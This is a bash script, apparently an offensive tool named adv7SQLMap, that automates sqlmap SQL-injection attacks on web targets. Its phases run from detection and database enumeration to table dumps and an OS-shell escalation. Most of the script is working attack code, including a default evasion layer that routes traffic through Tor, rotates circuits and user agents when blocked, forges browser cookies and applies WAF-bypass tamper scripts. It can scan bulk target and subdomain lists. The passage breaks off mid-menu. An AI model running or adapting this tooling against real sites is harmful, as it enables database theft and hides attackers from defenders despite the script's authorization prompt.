#!/usr/bin/env bash
#----------------------------------------------------------------------------
# Project     : adv7SQLMap v0.0.7
# Description : SQLi automation with built-in adv7-evasion layer
# Date        : 23/05/2026
# CreatedBy   : ADVAN7 Offensive Security | https://github.com/aopsec
#----------------------------------------------------------------------------
# EVASION LAYER (default ON — adv7FUZZ evasion principles applied to sqlmap):
#   Tor egress    — torsocks; hard abort if 9050 not up (--no-tor to skip)
#   User-Agent    — rotated from pool of 8 realistic browsers
#   Cookies       — browser-realistic session + GA analytics (random or custom)
#   Tamper        — space2comment,randomcase,charencode baseline
#   Timing        — --delay=1 between requests
#   Hex encoding  — --hex on all phases
#
# ROTATION (auto Tor circuit rotation on block detection):
#   Pre-phase canary: exit IP logged + block check before each phase
#   On block: Tier 0 NEWNYM via ControlPort 9051 (instant, no sudo)
#   Tier 1: sudo systemctl restart tor + 12s wait
#   Tier 2: 65s natural circuit expiry fallback
#   Post-run: CRITICAL error count in sqlmap log triggers rotation
#   Disable: --no-canary  |  Tune: --tor-retries N
#
# IMPORT MODES:
#   --burp FILE          BurpSuite "Save items" XML or raw HTTP request file (-r mode)
#   --targets FILE       URL file for multi-target scan (one URL per line, sqlmap -m)
#   --subdomains FILE    Subdomain list file (requires --url-tpl)
#   --url-tpl TEMPLATE   URL template with {HOST} placeholder for subdomain mode
#
# BURP + TOR EGRESS:
#   Default (--burp mode): torsocks NOT applied — BurpSuite routes through Tor itself.
#   Use --burp-tor to force torsocks wrap (double-proxy, usually not needed).
#
# PHASES:
#   0 — WAF Detection  : automatic WAF fingerprint probe (key=p in menu)
#   1 — Detection      : SQLi scan (level=1 risk=1)
#   2 — Enumeration    : DBs, tables, users, context
#   3 — Targeted Dump  : Specific DB/table dump
#   4 — Escalation     : OS shell / file read (--escalate)
#
# USAGE:
#   ./adv7SQLMap0.0.6v.sh [OPTIONS]
#   ./adv7SQLMap0.0.6v.sh  (interactive menu)
#
# OPTIONS:
#   -u URL         Target URL
#   -p PARAM       Specific parameter to test
#   -c COOKIE      Cookie string (overrides auto-gen)
#   -H HEADER      Custom HTTP header
#   -t TAMPER      Tamper scripts (overrides evasion default)
#   -x PROXY       HTTP proxy (e.g. http://127.0.0.1:8080)
#   -l LEVEL       sqlmap level 1-5 (default: 1)
#   -r RISK        sqlmap risk  1-3 (default: 1)
#   -T THREADS     Threads (default: 3)
#   --data DATA    POST data
#   --no-tor       Disable torsocks egress
#   --cookie M     Cookie mode: random | custom
#   --ua STRING    Force specific User-Agent
#   --escalate     Unlock Phase 4
#   --dry-run      Print commands without executing
#   --phase N      Run only phase N (0-4)
#   --skip-waf     Skip WAF heuristic checks
#   --no-canary    Disable Tor canary checks
#   --tor-retries N  Max rotation attempts per phase (default: 3)
#   --burp FILE          BurpSuite "Save items" XML or raw HTTP request file
#   --burp-tor           Force torsocks wrap in --burp mode (default: BurpSuite handles Tor)
#   --targets FILE       URL file for multi-target scan (one URL per line)
#   --subdomains FILE    Subdomain list file (requires --url-tpl)
#   --url-tpl TEMPLATE   URL template with {HOST} for subdomain mode
#   -h, --help     Show this help
#----------------------------------------------------------------------------

set -uo pipefail

VERSION="0.0.7"

# ── ANSI colours ────────────────────────────────────────────────────────────
G='\033[0;32m'
BG='\033[1;32m'
C='\033[0;36m'
R='\033[0;31m'
Y='\033[1;33m'
D='\033[2m'
B='\033[1m'
RS='\033[0m'

# ── UA pool (copied from adv7FUZZ.sh) ────────────────────────────────────────
UA_LIST=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
)
rotate_ua() { UA="${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}"; }

# ── State ───────────────────────────────────────────────────────────────────
TARGET=""
PARAM=""
COOKIE=""
HEADER=""
PROXY=""
POST_DATA=""
LEVEL=1
RISK=1
ESCALATE=false
DRY_RUN=false
AUTH_OK=false
OUT=""
LOG="/dev/null"
TEMPLATE=""
EXTRA_FLAGS=()
ONLY_PHASE=""

# ── Evasion defaults (always ON) ──────────────────────────────────────────────
USE_TOR=true
UA=""
COOKIE_STRING=""
COOKIE_MODE=""
TAMPER="space2comment,randomcase,charencode"
DELAY=1
HEX=true
THREADS=3
SKIP_WAF=false

# ── Tor rotation (ported from adv7FUZZ v0.0.3) ────────────────────────────────
TOR_MAX_RETRIES=3
TOR_CANARY_TIMEOUT=15
TOR_WAIT_AFTER_RESTART=12
TOR_CRIT_THRESHOLD=2
USE_CANARY=true

# ── Import modes ─────────────────────────────────────────────────────────────
BURP_FILE=""
TARGETS_FILE=""
SUBDOMAINS_FILE=""
URL_TPL=""
BURP_REQUESTS=()
# BurpSuite handles Tor egress by default — torsocks NOT applied to -r requests.
# Set to false via --burp-tor to force double-proxy (torsocks + BurpSuite Tor).
BURP_TOR_BYPASS=true

BASE_ARGS=()

# ── Cleanup on exit ─────────────────────────────────────────────────────────
trap 'tput cnorm; echo -e "${RS}"' EXIT
trap 'tput cnorm; echo -e "${RS}"; exit 130' INT
trap 'tput cnorm; echo -e "${RS}"; exit 143' TERM

# ── Argument parsing ──────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
    case "$1" in
        -u)  TARGET="$2";    shift 2 ;;
        -p)  PARAM="$2";     shift 2 ;;
        -c)  COOKIE="$2";    shift 2 ;;
        -H)  HEADER="$2";    shift 2 ;;
        -t)  TAMPER="$2";    shift 2 ;;
        -x)  PROXY="$2";     shift 2 ;;
        -l)  [[ "$2" =~ ^[1-5]$ ]] \
                 || { echo -e "${R}[!] -l requires level 1-5${RS}"; exit 1; }
             LEVEL="$2";    shift 2 ;;
        -r)  [[ "$2" =~ ^[1-3]$ ]] \
                 || { echo -e "${R}[!] -r requires risk 1-3${RS}"; exit 1; }
             RISK="$2";     shift 2 ;;
        -T)  [[ "$2" =~ ^[1-9][0-9]*$ ]] \
                 || { echo -e "${R}[!] -T requires a positive integer${RS}"; exit 1; }
             THREADS="$2";  shift 2 ;;
        --data)     POST_DATA="$2";   shift 2 ;;
        --no-tor)   USE_TOR=false;    shift ;;
        --cookie)   COOKIE_MODE="$2"; shift 2 ;;
        --ua)       UA="$2";          shift 2 ;;
        --escalate) ESCALATE=true;    shift ;;
        --dry-run)  DRY_RUN=true;     shift ;;
        --phase)    ONLY_PHASE="$2";  shift 2 ;;
        --skip-waf)   SKIP_WAF=true;              shift ;;
        --no-canary)  USE_CANARY=false;           shift ;;
        --tor-retries)
            [[ "$2" =~ ^[1-9][0-9]*$ ]] \
                || { echo -e "${R}[!] --tor-retries requires a positive integer${RS}"; exit 1; }
            TOR_MAX_RETRIES="$2"; shift 2 ;;
        --burp)       BURP_FILE="$2";       shift 2 ;;
        --burp-tor)   BURP_TOR_BYPASS=false; shift ;;
        --targets)    TARGETS_FILE="$2";    shift 2 ;;
        --subdomains) SUBDOMAINS_FILE="$2"; shift 2 ;;
        --url-tpl)    URL_TPL="$2";         shift 2 ;;
        -h|--help)
            grep "^#" "$0" | grep -v "^#!/" | sed 's/^# \{0,\}//'
            exit 0 ;;
        *) echo -e "${R}[!] Unknown option: $1${RS}"; exit 1 ;;
    esac
done

# Auto-detect: if -u received a file path rather than a URL, route to --targets semantics
if [[ -n "$TARGET" && ! "$TARGET" =~ ^https?:// && -f "$TARGET" ]]; then
    if [[ -n "$BURP_FILE" || -n "$TARGETS_FILE" || -n "$SUBDOMAINS_FILE" ]]; then
        echo -e "${R}[!] -u file path conflicts with an active import mode. Use --targets.${RS}"
        exit 1
    fi
    echo -e "${G}[*] Auto-detected scope file via -u — switching to --targets mode: $TARGET${RS}"
    TARGETS_FILE="$TARGET"
    TARGET=""
fi

# ── Dependency check ─────────────────────────────────────────────────────────
for _tool in sqlmap jq; do
    if ! command -v "$_tool" &>/dev/null; then
        echo -e "${R}[!] Error: $_tool not found. Install it first.${RS}"
        exit 1
    fi
done
if $USE_TOR && ! command -v torsocks &>/dev/null; then
    echo -e "${R}[!] Error: torsocks not found. Install it or pass --no-tor${RS}"
    echo -e "    Arch: pacman -S torsocks"
    exit 1
fi

# ── Tor pre-flight (hard abort — no silent IP leak) ──────────────────────────
if $USE_TOR; then
    if ! ss -tlnp 2>/dev/null | grep -q "127.0.0.1:9050"; then
        echo "[!] Tor SOCKS not listening on 127.0.0.1:9050"
        echo "    Start Tor : systemctl start tor"
        echo "    Skip Tor  : pass --no-tor"
        exit 1
    fi
fi

# ── Cookie generation (copied from adv7FUZZ.sh) ──────────────────────────────
gen_random_cookies() {
    local sid ga_uid ga_ts gid_ts
    sid=$(openssl rand -hex 16)
    ga_uid=$(shuf -i 100000000-999999999 -n1)
    ga_ts=$(date +%s)
    gid_ts=$(shuf -i 100000000-999999999 -n1)
    echo "PHPSESSID=${sid}; _ga=GA1.2.${ga_uid}.${ga_ts}; _gid=GA1.2.${gid_ts}.${ga_ts}"
}

select_cookies() {
    local _cookie_choice
    if [[ -n "$COOKIE_MODE" ]]; then
        case "$COOKIE_MODE" in
            random)
                COOKIE_STRING=$(gen_random_cookies)
                echo "  [*] Cookies (random): ${COOKIE_STRING}" ;;
            custom)
                read -rp "  Paste cookies > " COOKIE_STRING ;;
            *)
                echo "[!] Unknown --cookie mode '${COOKIE_MODE}'. Use: random|custom"
                exit 1 ;;
        esac
        echo ""
        return
    fi
    echo ""
    echo "  Cookie strategy:"
    echo "  [1] Random browser cookies  (PHPSESSID + GA analytics — WAF evasion)"
    echo "  [2] Custom cookies          (paste your own session/auth string)"
    read -rp "  Select [1/2] > " _cookie_choice
    case "$_cookie_choice" in
        1)
            COOKIE_STRING=$(gen_random_cookies)
            echo "  [*] Generated: ${COOKIE_STRING}" ;;
        2)
            read -rp "  Paste cookies > " COOKIE_STRING ;;
        *)
            echo "  [*] Invalid — defaulting to random cookies"
            COOKIE_STRING=$(gen_random_cookies)
            echo "  [*] Generated: ${COOKIE_STRING}" ;;
    esac
    echo ""
}

# ── Tor rotation helpers (ported from adv7FUZZ v0.0.3) ──────────────────────

tor_get_exit_ip() {
    torsocks curl -s --max-time "$TOR_CANARY_TIMEOUT" \
        "https://check.torproject.org/api/ip" 2>/dev/null \
        | jq -r '.IP // empty' 2>/dev/null || true
}

tor_is_blocked() {
    local _code _size _out _probe_url
    # Resolve a valid probe URL for the Tor block check.
    # TARGET may be empty (--targets / --subdomains mode) or a bare hostname (Burp mode).
    # In those cases fall back to the first https?:// URL in TARGETS_FILE, or skip the
    # probe entirely (return 1 = not blocked) to avoid false rotation delays.
    if [[ "$TARGET" =~ ^https?:// ]]; then
        _probe_url="$TARGET"
    elif [[ -n "$TARGETS_FILE" && -f "$TARGETS_FILE" ]]; then
        _probe_url=$(grep -m1 -E '^https?://' "$TARGETS_FILE" 2>/dev/null || true)
    fi
    [[ -z "$_probe_url" ]] && return 1   # nothing probeable — assume unblocked
    _out=$(torsocks curl -s -o /dev/null \
        -w "%{http_code} %{size_download}" \
        --max-time "$TOR_CANARY_TIMEOUT" -A "$UA" "$_probe_url" 2>/dev/null) || _out="000 0"
    read -r _code _size <<< "$_out"
    [[ "$_code" == "000" ]] && return 0
    [[ "$_code" == "403" ]] && [[ "$_size" -ge 4400 ]] && [[ "$_size" -le 4700 ]] && return 0
    return 1
}

tor_newnym() {
    local _auth_cookie="/var/lib/tor/control_auth_cookie"
    local _nc_out
    if [[ -r "$_auth_cookie" ]]; then
        local _hex
        _hex=$(xxd -p < "$_auth_cookie" | tr -d '\n')
        _nc_out=$(printf 'AUTHENTICATE %s\r\nSIGNAL NEWNYM\r\nQUIT\r\n' "$_hex" \
            | nc -w 5 127.0.0.1 9051 2>/dev/null)
        echo "$_nc_out" | grep -q "^250" && return 0
        return 1
    fi
    _nc_out=$(printf 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n' \
        | nc -w 5 127.0.0.1 9051 2>/dev/null)
    echo "$_nc_out" | grep -q "^250"
}

tor_rotate() {
    local _attempt="${1:-1}"
    local _current_ip
    _current_ip=$(tor_get_exit_ip)
    echo "" | tee -a "$LOG"
    echo "[!] Tor exit blocked — rotating circuit (attempt ${_attempt}/${TOR_MAX_RETRIES})" \
        | tee -a "$LOG"
    echo "    Blocked exit : ${_current_ip:-unknown}" | tee -a "$LOG"

    # Tier 0: NEWNYM via ControlPort 9051 (instant, no sudo)
    echo "[*] Tier 0 — NEWNYM via ControlPort 9051" | tee -a "$LOG"
    if tor_newnym; then
        sleep 3
        local _newnym_ip
        _newnym_ip=$(tor_get_exit_ip)
        if [[ -n "$_newnym_ip" ]] && [[ "$_newnym_ip" != "$_current_ip" ]]; then
            rotate_ua
            echo "[+] NEWNYM succeeded — new exit: $_newnym_ip  |  New UA: ${UA:0:40}..." | tee -a "$LOG"
            return 0
        fi
        echo "[!] NEWNYM: exit IP unchanged — trying Tier 1" | tee -a "$LOG"
    else
        echo "[!] NEWNYM failed (ControlPort not available) — trying Tier 1" | tee -a "$LOG"
    fi

    # Tier 1: sudo systemctl restart tor
    echo "[*] Tier 1 — sudo systemctl restart tor" | tee -a "$LOG"
    echo "    (Enter sudo password if prompted)" | tee -a "$LOG"
    if sudo systemctl restart tor 2>/dev/null; then
        echo "[*] Tor restarted — waiting ${TOR_WAIT_AFTER_RESTART}s for circuits..." \
            | tee -a "$LOG"
        sleep "$TOR_WAIT_AFTER_RESTART"
        local _new_ip
        _new_ip=$(tor_get_exit_ip)
        if [[ -n "$_new_ip" ]] && [[ "$_new_ip" != "$_current_ip" ]]; then
            rotate_ua
            echo "[+] New Tor exit: $_new_ip  |  New UA: ${UA:0:40}..." | tee -a "$LOG"
            return 0
        fi
        echo "[!] Exit IP unchanged after restart — trying Tier 2" | tee -a "$LOG"
    else
        echo "[!] sudo restart failed. Tip: enable ControlPort for passwordless rotation:" \
            | tee -a "$LOG"
        echo "      /etc/tor/torrc → add: ControlPort 9051 + CookieAuthentication 1" \
            | tee -a "$LOG"
        echo "      then: sudo systemctl restart tor  (once to apply the config)" \
            | tee -a "$LOG"
    fi

    # Tier 2: 65s natural Tor circuit expiry
    echo "[*] Tier 2 — waiting 65s for natural Tor circuit rotation..." | tee -a "$LOG"
    sleep 65
    local _rotated_ip
    _rotated_ip=$(tor_get_exit_ip)
    if [[ -n "$_rotated_ip" ]] && [[ "$_rotated_ip" != "$_current_ip" ]]; then
        rotate_ua
        echo "[+] Natural rotation — new exit: $_rotated_ip  |  New UA: ${UA:0:40}..." | tee -a "$LOG"
        return 0
    fi

    echo "[!] Exit IP unchanged — phase will continue with current circuit" | tee -a "$LOG"
    return 1
}

tor_check_and_rotate() {
    $USE_CANARY || return 0
    $USE_TOR    || return 0
    $DRY_RUN    && return 0
    local _exit_ip _attempt=0
    _exit_ip=$(tor_get_exit_ip)
    echo "[*] Canary — Tor exit: ${_exit_ip:-unknown}" | tee -a "$LOG"
    while tor_is_blocked; do
        (( _attempt++ )) || true
        if [[ "$_attempt" -gt "$TOR_MAX_RETRIES" ]]; then
            echo "[!] Max retries (${TOR_MAX_RETRIES}) reached — continuing" | tee -a "$LOG"
            return 1
        fi
        tor_rotate "$_attempt" || true
    done
    return 0
}

# ── Import helpers ────────────────────────────────────────────────────────────

burp_detect_format() {
    local _f="$1"
    [[ ! -f "$_f" ]] && { echo unknown; return; }
    local _first; _first=$(head -1 "$_f")
    [[ "$_first" =~ ^[A-Z]+\ .*HTTP/[0-9] ]] && { echo raw; return; }
    grep -q '<items\|<?xml' "$_f" 2>/dev/null && { echo xml; return; }
    echo unknown
}

burp_extract_requests() {
    local _xml="$1" _dir="$2"
    if ! command -v python3 &>/dev/null; then
        echo -e "${R}[!] python3 required for Burp XML extraction. Install it first.${RS}" >&2
        return 1
    fi
    ( umask 077; mkdir -p "$_dir" )
    python3 - "$_xml" "$_dir" <<'PYEOF'
import xml.etree.ElementTree as ET, base64, sys, os
root = ET.parse(sys.argv[1]).getroot()
for i, item in enumerate(root.findall('item')):
    el = item.find('request')
    if el is None:
        continue
    data = el.text or ''
    if el.get('base64', 'false').lower() == 'true':
        data = base64.b64decode(data).decode('latin-1', errors='replace')
    url_el = item.find('url')
    url = url_el.text if url_el is not None else 'unknown'
    fname = os.path.join(sys.argv[2], 'burp_req_{:03d}.txt'.format(i))
    with open(fname, 'w') as f:
        f.write(data)
    print('{}|{}'.format(url, fname))
PYEOF
}

build_burp_args() {
    local _req="$1"
    BASE_ARGS=(
        -r "$_req"
        --batch
        --threads="$THREADS"
        --level="$LEVEL"
        --risk="$RISK"
        --timeout=30
        --retries=2
        --random-agent
    )
    [[ -n "$TAMPER"  ]] && BASE_ARGS+=(--tamper="$TAMPER")
    (( DELAY > 0 ))     && BASE_ARGS+=(--delay="$DELAY")
    $HEX                && BASE_ARGS+=(--hex)
    $SKIP_WAF           && BASE_ARGS+=(--skip-waf)
    [[ -n "$COOKIE"  ]] && BASE_ARGS+=(--cookie="$COOKIE")
    [[ -n "$PROXY"   ]] && BASE_ARGS+=(--proxy="$PROXY")
    [[ ${#EXTRA_FLAGS[@]} -gt 0 ]] && BASE_ARGS+=("${EXTRA_FLAGS[@]}")
}

run_sqlmap_burp() {
    local _req="$1" _label="${2:-BurpSuite request}"
    build_burp_args "$_req"
    local -a cmd=(sqlmap "${BASE_ARGS[@]}" --dbs "--output-dir=${OUT}/burp_scan")
    # BurpSuite routes through Tor by default — skip torsocks to avoid double-proxy.
    # --burp-tor overrides this (sets BURP_TOR_BYPASS=false).
    if $USE_TOR && ! $BURP_TOR_BYPASS; then
        cmd=(torsocks "${cmd[@]}")
    fi
    local _cmd_display="${cmd[*]}"
    [[ -n "$COOKIE_STRING" ]] && _cmd_display="${_cmd_display//"$COOKIE_STRING"/***}"
    [[ -n "$COOKIE"        ]] && _cmd_display="${_cmd_display//"$COOKIE"/***}"
    [[ "$PROXY" == *"@"* ]] && _cmd_display="${_cmd_display//"$PROXY"/***}"
    echo -e "\n${G}[*] ${_label}${RS}"
    echo -e "${D}    CMD: ${_cmd_display}${RS}\n"
    echo "CMD: ${cmd[*]}" >> "$LOG"
    if $DRY_RUN; then
        echo -e "${Y}    [DRY-RUN] Skipping execution.${RS}"
        return 0
    fi
    local _log_line_start=0
    [[ -f "$LOG" ]] && _log_line_start=$(wc -l < "$LOG")
    "${cmd[@]}" 2>&1 | tee -a "$LOG"
    if $USE_CANARY && $USE_TOR && [[ "$LOG" != "/dev/null" ]]; then
        local _crits
        _crits=$(tail -n +"$(( _log_line_start + 1 ))" "$LOG" 2>/dev/null \
            | grep -c "CRITICAL.*unable to connect" || echo 0)
        if [[ "$_crits" -gt "$TOR_CRIT_THRESHOLD" ]]; then
            echo -e "\n${Y}[!] ${_crits} connection drops — rotating Tor circuit${RS}"
            tor_rotate 1 || true
        fi
    fi
}

do_auth_bulk() {
    local _src_file="$1"
    local _auth
    if $AUTH_OK; then return 0; fi
    echo ""
    echo -e "${R}  [!] BULK AUTHORIZATION REQUIRED${RS}"
    echo -e "  Targets:"
    grep -oE 'https?://[^/]+' "$_src_file" 2>/dev/null | sort -u | while read -r _d; do
        echo "      • ${_d}"
    done
    echo ""
    echo -e "  You must have explicit written permission for ALL targets above."
    echo ""
    read -rp "  Confirm authorized [yes/N] > " _auth
    if [[ "${_auth,,}" != "yes" ]]; then
        echo -e "${R}[*] Aborted — authorization not confirmed.${RS}"
        return 1
    fi
    AUTH_OK=true
    if [[ -z "$OUT" ]]; then
        OUT="./sqli_multi_$(date +%Y%m%d_%H%M)"
        ( umask 077; mkdir -p "$OUT" )
    fi
    if [[ "$LOG" == "/dev/null" ]]; then
        LOG="${OUT}/adv7SQLMap_$(date +%Y%m%d_%H%M%S).log"
        touch "$LOG" && chmod 600 "$LOG"
    fi
    echo -e "${G}[*] Output dir: ${OUT}${RS}"
    echo -e "${G}[*] Log:        ${LOG}${RS}"
    sleep 1
}

run_burp_mode() {
    local _fmt _line _url _req_file
    _fmt=$(burp_detect_format "$BURP_FILE")
    if [[ "$_fmt" == "unknown" ]]; then
        echo -e "${R}[!] Cannot detect format of '${BURP_FILE}'. Expected raw HTTP request or Burp XML.${RS}"
        return 1
    fi
    if [[ "$_fmt" == "raw" ]]; then
        TARGET=$(grep -i '^Host:' "$BURP_FILE" | head -1 | awk '{print $2}' | tr -d '\r')
        [[ -z "$TARGET" ]] && TARGET="unknown"
        # shellcheck disable=SC2034  # tracked as import-mode global state (see header)
        BURP_REQUESTS=("$BURP_FILE")
        do_auth || return 1
        tor_check_and_rotate || true
        run_sqlmap_burp "$BURP_FILE" "BurpSuite raw request → ${TARGET}"
    else
        # XML mode: extract all items
        local _req_dir
        _req_dir=$(mktemp -d "${TMPDIR:-/tmp}/burp_reqs_XXXXXX")
        local -a _pairs
        mapfile -t _pairs < <(burp_extract_requests "$BURP_FILE" "$_req_dir")
        if [[ "${#_pairs[@]}" -eq 0 ]]; then
            echo -e "${R}[!] No requests extracted from Burp XML.${RS}"
            rm -rf "$_req_dir"
            return 1
        fi
        echo -e "${G}[*] Extracted ${#_pairs[@]} request(s) from Burp XML.${RS}"
        # Set TARGET to first item's host for do_auth domain extraction
        _url=$(echo "${_pairs[0]}" | cut -d'|' -f1)
        TARGET="${_url#*//}"; TARGET="${TARGET%%/*}"
        do_auth || return 1
        local _i=1
        for _line in "${_pairs[@]}"; do
            _url=$(echo "$_line" | cut -d'|' -f1)
            _req_file=$(echo "$_line" | cut -d'|' -f2)
            echo -e "\n${C}[*] Request ${_i}/${#_pairs[@]} — ${_url}${RS}"
            tor_check_and_rotate || true
            run_sqlmap_burp "$_req_file" "BurpSuite item ${_i}: ${_url}"
            (( _i++ ))
        done
        rm -rf "$_req_dir"
    fi
    echo -e "\n${G}[*] BurpSuite import scan complete.${RS}"
}

run_multi_target() {
    if [[ ! -f "$TARGETS_FILE" ]]; then
        echo -e "${R}[!] Targets file not found: ${TARGETS_FILE}${RS}"
        return 1
    fi
    local _count
    _count=$(grep -cvE '^[[:space:]]*(#|$)' "$TARGETS_FILE" 2>/dev/null || echo 0)
    if [[ "$_count" -eq 0 ]]; then
        echo -e "${R}[!] Targets file is empty.${RS}"
        return 1
    fi
    echo -e "${G}[*] Multi-target scan — ${_count} URL(s) from ${TARGETS_FILE}${RS}"
    do_auth_bulk "$TARGETS_FILE" || return 1
    tor_check_and_rotate || true
    local -a _margs=(
        -m "$TARGETS_FILE"
        --batch
        --threads="$THREADS"
        --level="$LEVEL"
        --risk="$RISK"
        --timeout=30
        --retries=2
        --random-agent
        --dbs
        "--output-dir=${OUT}/multi_scan"
    )
    [[ -n "$TAMPER"  ]] && _margs+=(--tamper="$TAMPER")
    (( DELAY > 0 ))     && _margs+=(--delay="$DELAY")
    $HEX                && _margs+=(--hex)
    $SKIP_WAF           && _margs+=(--skip-waf)
    [[ -n "$COOKIE"  ]] && _margs+=(--cookie="$COOKIE")
    [[ -n "$PROXY"   ]] && _margs+=(--proxy="$PROXY")
    [[ ${#EXTRA_FLAGS[@]} -gt 0 ]] && _margs+=("${EXTRA_FLAGS[@]}")
    local -a _cmd=(sqlmap "${_margs[@]}")
    $USE_TOR && _cmd=(torsocks "${_cmd[@]}")
    local _mt_display="${_cmd[*]}"
    [[ -n "$COOKIE_STRING" ]] && _mt_display="${_mt_display//"$COOKIE_STRING"/***}"
    [[ -n "$COOKIE"        ]] && _mt_display="${_mt_display//"$COOKIE"/***}"
    [[ "$PROXY" == *"@"* ]] && _mt_display="${_mt_display//"$PROXY"/***}"
    echo -e "\n${G}[*] Multi-target scan (sqlmap -m)${RS}"
    echo -e "${D}    CMD: ${_mt_display}${RS}\n"
    echo "CMD: ${_cmd[*]}" >> "$LOG"
    if $DRY_RUN; then
        echo -e "${Y}    [DRY-RUN] Skipping execution.${RS}"
        return 0
    fi
    local _log_line_start=0
    [[ -f "$LOG" ]] && _log_line_start=$(wc -l < "$LOG")
    "${_cmd[@]}" 2>&1 | tee -a "$LOG"
    if $USE_CANARY && $USE_TOR && [[ "$LOG" != "/dev/null" ]]; then
        local _crits
        _crits=$(tail -n +"$(( _log_line_start + 1 ))" "$LOG" 2>/dev/null \
            | grep -c "CRITICAL.*unable to connect" || echo 0)
        if [[ "$_crits" -gt "$TOR_CRIT_THRESHOLD" ]]; then
            echo -e "\n${Y}[!] ${_crits} connection drops — rotating Tor circuit${RS}"
            tor_rotate 1 || true
        fi
    fi
    echo -e "\n${G}[*] Multi-target scan complete.${RS}"
}

run_subdomain_scan() {
    if [[ ! -f "$SUBDOMAINS_FILE" ]]; then
        echo -e "${R}[!] Subdomains file not found: ${SUBDOMAINS_FILE}${RS}"
        return 1
    fi
    if [[ -z "$URL_TPL" ]]; then
        echo -e "${R}[!] --url-tpl is required for subdomain scan mode.${RS}"
        echo -e "    Example: --url-tpl 'https://{HOST}/login?id=1'"
        return 1
    fi
    OUT="./sqli_subdomains_$(date +%Y%m%d_%H%M)"
    ( umask 077; mkdir -p "$OUT" )
    TARGETS_FILE="${OUT}/subdomain_targets.txt"
    local _sub
    while IFS= read -r _sub; do
        _sub="${_sub%$'\r'}"
        [[ -z "$_sub" || "$_sub" =~ ^[[:space:]]*# ]] && continue
        echo "${URL_TPL/\{HOST\}/$_sub}" >> "$TARGETS_FILE"
    done < "$SUBDOMAINS_FILE"
    local _n; _n=$(wc -l < "$TARGETS_FILE")
    echo -e "${G}[*] Generated ${TARGETS_FILE} (${_n} targets)${RS}"
    run_multi_target
}

# ── Box drawing helpers ──────────────────────────────────────────────────────
_W=58

box_top() { echo -e "${BG}╔$(printf '═%.0s' $(seq 1 $_W))╗${RS}"; }
box_mid() { echo -e "${BG}╠$(printf '═%.0s' $(seq 1 $_W))╣${RS}"; }
box_bot() { echo -e "${BG}╚$(printf '═%.0s' $(seq 1 $_W))╝${RS}"; }
box_row() {
    local txt="$1"
    local visible; visible=$(printf '%s' "$txt" | sed 's/\x1b\[[0-9;]*m//g')
    local pad=$(( _W - ${#visible} - 1 ))
    (( pad < 0 )) && pad=0
    echo -e "${BG}║${RS} ${txt}$(printf ' %.0s' $(seq 1 $pad))${BG}║${RS}"
}
box_empty() { box_row ""; }

_trunc() {
    local s="$1" maxlen="$2"
    echo "${s:0:$maxlen}"
}

# ── Header ───────────────────────────────────────────────────────────────────
draw_header() {
    clear
    tput civis
    box_top
    box_row "${B}adv7SQLMap v${VERSION}${RS}      ${D}ADVAN7 Offensive Security${RS}"
    box_empty

    local tgt="${TARGET:-${D}(not set)${RS}}"
    box_row "Target  : $(_trunc "$tgt" 46)"

    local esc_label dry_label
    if $ESCALATE; then esc_label="${R}ON${RS}"; else esc_label="${D}OFF${RS}"; fi
    if $DRY_RUN;  then dry_label="${Y}ON${RS}"; else dry_label="${D}OFF${RS}"; fi
    box_row "Lvl:${LEVEL}  Risk:${RISK}  Thr:${THREADS}  Esc:${esc_label}  Dry:${dry_label}"

    local tor_label hex_label
    if $USE_TOR; then tor_label="${G}ON${RS}"; else tor_label="${D}OFF${RS}"; fi
    if $HEX;     then hex_label="${G}ON${RS}"; else hex_label="${D}OFF${RS}"; fi
    box_row "Tor:${tor_label}  Hex:${hex_label}  Tamper:$(_trunc "$TAMPER" 28)"

    local canary_lbl
    if $USE_CANARY && $USE_TOR; then
        canary_lbl="${G}ON${RS} ${D}(retries=${TOR_MAX_RETRIES})${RS}"
    else
        canary_lbl="${D}OFF${RS}"
    fi
    box_row "Cny : ${canary_lbl}"

    local ua_label ck_label
    ua_label="${UA:-${D}(auto)${RS}}"
    box_row "UA  : $(_trunc "$ua_label" 48)"
    if [[ -n "$COOKIE" ]]; then
        ck_label="${G}set (custom)${RS}"
    elif [[ -n "$COOKIE_STRING" ]]; then
        ck_label="${G}set (auto)${RS}"
    else
        ck_label="${D}none${RS}"
    fi
    box_row "Cookie: ${ck_label}"

    if [[ -n "$TEMPLATE" ]]; then
        box_row "Tpl : ${Y}${TEMPLATE}${RS}"
    fi
    if [[ -n "$OUT" ]]; then
        box_row "Out : $(_trunc "$OUT" 48)"
    fi
    if [[ -n "$BURP_FILE" ]]; then
        box_row "Imp : ${Y}BurpSuite${RS} $(_trunc "$BURP_FILE" 38)"
    elif [[ -n "$TARGETS_FILE" ]]; then
        box_row "Imp : ${Y}Multi-target${RS} $(_trunc "$TARGETS_FILE" 34)"
    elif [[ -n "$SUBDOMAINS_FILE" ]]; then
        box_row "Imp : ${Y}Subdomain${RS} $(_trunc "$SUBDOMAINS_FILE" 36)"
    fi
    box_mid
}

# ── Main menu ────────────────────────────────────────────────────────────────
draw_main_menu() {
    local esc_tag
    if $ESCALATE; then
        esc_tag="${R}[ACTIVE]${RS}"
    else
        esc_tag="${D}[LOCKED]${RS}"
    fi

    box_row "${G}[1]${RS} Configure Target & Options"
    box_row "${G}[8]${RS} Load Template"
